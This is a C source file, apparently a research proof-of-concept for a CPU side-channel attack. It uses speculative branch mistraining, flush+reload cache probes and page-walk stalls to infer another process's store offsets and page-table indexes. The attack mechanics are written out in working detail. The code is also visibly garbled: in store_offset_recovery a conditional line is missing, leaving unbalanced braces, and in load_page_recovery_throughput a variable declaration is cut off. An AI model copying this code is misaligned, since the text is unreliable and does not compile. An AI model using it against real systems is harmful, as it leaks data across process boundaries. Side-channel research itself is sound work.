#define _GNU_SOURCE

#include <signal.h>
#include <stdio.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#include "utils.h"
#include "ptedit_header.h"

static u32 threshold; // cache hit threshold
static u8 *victim_page, *normal_page, *probe, *garbage; // some handy pages

// allocate PRIVATE memory and initialize it
static u8 *setup_page(size_t size, u8 init) {
    u8 *page = mmap(NULL, size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        return NULL;
    }
    memset(page, init, size);
    return page;
}

static void unmap(u8 *page, size_t size) {
    if (page) {
        munmap(page, size);
    }
}

// get index for a given pointer and a level of page table
// PGD (level 4) -> PUD (level 3) -> PMD (level 2) -> PTE (level 1)
static u16 get_PL_index(void *ptr, u8 level) {
    u64 page = ((uintptr_t)ptr >> 12);
    return (page >> ((level - 1) * 9)) & 0x1ff;
}

// we only need one bit of information to indicate if page walk stalls,
// therefore, we only need a probe array with one element, and it will be
// accessed if page walk does not stall. So, we will have something like this:
// probe[*load], if page walk does not stall, *load returns 0 and probe[0] is
// acessed. However, we want *load to return a non-zero if page walk does not
// stall, since zero can be a default value used for some forwarding (e.g.,
// Meltdown), so we use an array with two pages and access probe[1 * page_size].
static void flush_probe() {
    _clflush(probe + getpagesize());
}

static bool check_probe() {
    return _time_maccess(&probe[getpagesize()], 1) < threshold;
}
// end of util functions

// use the first (MISTRAIN_EPOCH - 1) to mistrain, then mispredict
#define MISTRAIN_EPOCH 6
static int __attribute__((noinline)) store_offset_recovery() {
    int ret = 0;
    const u32 MEASURES = 100;
    const u32 page_size = getpagesize();
    static volatile u64 _size1 = 10, _size2 = 11,
                        _size3 = 12; // slow branch gadgets

    pid_t pid = fork();
    if (pid == 0) {
        u16 offset = 0x888; // offset of the store
        while (true) {
            // normal_page is NOT shared, the child process will make a copy on
            // write
            _mwrite(&normal_page[offset], 0xff);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    // allocate 512 pages to cover all possible PL1 (PTE) indexes
    u8 *pages = setup_page((1 << 9) * page_size, 0x1);
    if (!pages) {
        ret = 3;
        goto mmap_fail;
    }

    for (u32 disp = 0; disp < (1 << 9); disp++) {
        u8 *ptr = pages + disp * page_size;
        u32 counter = 0;
        for (size_t cnt = 1; cnt <= MEASURES * MISTRAIN_EPOCH; cnt++) {
            flush_probe(); // prepare F+R probe
            _clflush_v(&_size1); // create long latency branch
            _clflush_v(&_size2);
            _clflush_v(&_size3);
            ptedit_invalidate_tlb(ptr);
            _mfence();

            // tmp will be all ones (-1) if cnt % MISTRAIN_EPOCH == 0;
            // i.e., it's time to mispredict
            u64 tmp = ((cnt % MISTRAIN_EPOCH) - 1) & (~0xffff);
            tmp = tmp | (tmp >> 16);

            // only select probe on misprediction (i.e., tmp = -1)
            // equivalent to arr = tmp ? probe : garbage, but branchless
            u8 *arr = (u8 *)SEL_NOSPEC(tmp, probe, garbage);
            _lfence();
            if ((tmp < _size1) & (tmp < _size2) & (tmp < _size3)) {
                // on misprediction, arr points to probe if *ptr is NOT stalled,
                // we can observe signals from probe[PAGE_SIZE]
                _maccess(&arr[*ptr * page_size]);
            }

            // check if *ptr successfully returns 0x1 during misprediction
                counter += 1;
            }
        }

        u16 pte_offset = ((uintptr_t)ptr & 0x1ff000) >> 9;
        printf("%#5x\t%3d\n", pte_offset, counter);
    }

    unmap(pages, (1 << 9) * page_size);
mmap_fail:
    kill(pid, SIGKILL);
    return ret;
}

static int __attribute__((noinline)) load_page_recovery_throughput() {
    int ret;
    const u32 MEASURES = 100, REPEATS = 100000;
    const u32 page_size = getpagesize();

    // a page with PL4_index = 0x87, PL3_index = 0x65,
    // PL2_index = 0x43, PL1_index = 0x21
    u8 *page = mmap((void *)0x439948621000ull, page_size,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        return 1;
    }

    fprintf(stderr, "Oracles:\n");
    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));

    // shared variable controls when to measure throughput in sender
                             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    // shared page to store throughput results
    u64 *counts = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (start == MAP_FAILED || counts == MAP_FAILED) {
        return 1;
    }
    *start = 0;
    memset(counts, 0, page_size);

    pid_t pid = fork();
    if (pid == 0) {
        // sender
        u32 idx = 0;
        while (true) {
            u64 cnt = 0;
            while (!*start); /* busy wait */

            // start throughput measurement, we should observe a lower
            // throughput if _maccess(page)'s page walk is stalled a lot
            while (*start) {
                ptedit_invalidate_tlb(page);
                _maccess(page);
                _lfence();
                cnt += 1;
            }
            // save throughput results
            counts[idx % 512] = cnt;
            idx++;
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    // receiver
    for (u32 disp = 0; disp < (1 << 9); disp++) {
        u8 *ptr = victim_page + (disp << 3);
        usleep(1000);
        *start = 1; // start measurement in sender
        _lfence();
        for (u32 rept = 0; rept < REPEATS; rept++) {
            _mwrite(ptr, 0xff); // attempt to stall page walks in sender
        }
        *start = 0; // end measurement
    }

    for (u32 disp = 0; disp < (1 << 9); disp++) {
        printf("%#5x\t%lu\n", disp, counts[disp]);
    }

    kill(pid, SIGKILL);
    munmap(counts, page_size);
    munmap((u8 *)start, page_size);
    munmap(page, page_size);
    return ret;
}

static int __attribute__((noinline)) load_page_recovery_contention() {
    int ret;
    const u32 MEASURES = 50, REPEATS = 100000;
    const u32 page_size = getpagesize();

    // a page with PL4_index = 0x87, PL3_index = 0x65,
    // PL2_index = 0x43, PL1_index = 0x21
    u8 *page = mmap((void *)0x439948621000ull, page_size,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        return 1;
    }

    fprintf(stderr, "Oracles:\n");
    fprintf(stderr, "\tPL4 index: %#x\n", get_PL_index(page, 4));
    fprintf(stderr, "\tPL3 index: %#x\n", get_PL_index(page, 3));
    fprintf(stderr, "\tPL2 index: %#x\n", get_PL_index(page, 2));
    fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));

    pid_t pid = fork();
    if (pid == 0) {
        u32 idx = 0;
        while (true) {
            ptedit_invalidate_tlb(page);
            _maccess(page);
        }
    } else if (pid < 0) {
        fprintf(stderr, "Failed to fork.\n");
        return 2;
    }

    for (u32 disp = 0; disp < (1 << 9); disp++) {
        u8 *ptr = victim_page + (disp << 3);
        u64 total_time = 0;
        // measure execution latency for MEASURES times
        // we should observe a smaller latency if our store stalls page walk
        // in the sender, since more L1D resources would be available
        for (u32 cnt = 0; cnt < MEASURES; cnt++) {
            struct timespec t_start, t_end;
            _lfence();
            clock_gettime(CLOCK_MONOTONIC, &t_start);
            for (u32 rept = 0; rept < REPEATS; rept++) {
                _mwrite(ptr, 0xff);
            }
            clock_gettime(CLOCK_MONOTONIC, &t_end);
            u64 nsec_diff = (t_end.tv_sec - t_start.tv_sec) * 1e9 +
                            (t_end.tv_nsec - t_start.tv_nsec);
            total_time += nsec_diff;
        }
        printf("%#5x\t%lu\n", disp, total_time / MEASURES);
    }

    kill(pid, SIGKILL);
    munmap(page, page_size);
    return ret;
}

int main(int argc, char **argv) {
    int ret = 0;
    if (ptedit_init()) {
        fprintf(stderr, "Failed to initialize PTEditor, "
                        "is the kernel module loaded?\n");
        return -1;
    }

    threshold = _get_cache_hit_threshold();
    fprintf(stderr, "Cache Hit Threshold: %u\n", threshold);

    victim_page = setup_page(getpagesize(), 0x1);
    normal_page = setup_page(getpagesize(), 0x2);
    probe = setup_page(getpagesize() * 2, 0x0);
    garbage = setup_page(getpagesize() * 2, 0x0);
    if (!victim_page || !normal_page || !probe || !garbage) {
        fprintf(stderr, "Failed to allocate pages.\n");
        ret = -2;
        goto mmap_fail;
    }

    switch (argv[1][0]) {
        case '0':
            ret = store_offset_recovery();
            break;
        case '1':
            ret = load_page_recovery_throughput();
            break;
        case '2':
            ret = load_page_recovery_contention();
            break;
        default:
            ret = -3;
    }

mmap_fail:
    unmap(victim_page, getpagesize());
    unmap(normal_page, getpagesize());
    unmap(probe, getpagesize() * 2);
    unmap(garbage, getpagesize() * 2);
segv_fail:
    ptedit_cleanup();
    return ret;
}
